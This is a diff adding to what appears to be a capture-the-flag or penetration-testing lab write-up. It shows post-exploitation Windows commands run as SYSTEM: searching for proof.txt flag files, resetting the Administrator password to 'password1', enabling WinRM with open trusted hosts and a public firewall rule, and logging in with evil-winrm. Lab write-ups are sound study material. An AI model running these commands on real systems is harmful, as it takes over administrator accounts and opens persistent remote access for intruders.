@@ -90,3 +90,27 @@ whoami
 nt authority\system
 
 ```
+Find user or local or proof.txt 
+```
+Get-ChildItem -Path C:\ -Recurse -Filter "*.txt" | Where-Object { $_.Name -match "^(user|local|proof)\.txt$" } | Select-Object FullName
+```
+Found proof.txt in C:\\Users\\Administrator\\Desktop\\proof.txt
+Reset the administrator password to password1
+```
+net user Administrator password1
+```
+Enable WinRM
+```
+Enable-PSRemoting -Force
+```
+```
+Set-NetFirewallRule -Name 'WINRM-HTTP-In-TCP-PUBLIC' -Enabled True
+```
+Set trusted hosts to everyone
+```
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
+```
+Gives me access via evil-winrm with 
+```
+evil-winrm -i 192.168.227.121 -u Administrator -p password1
+```
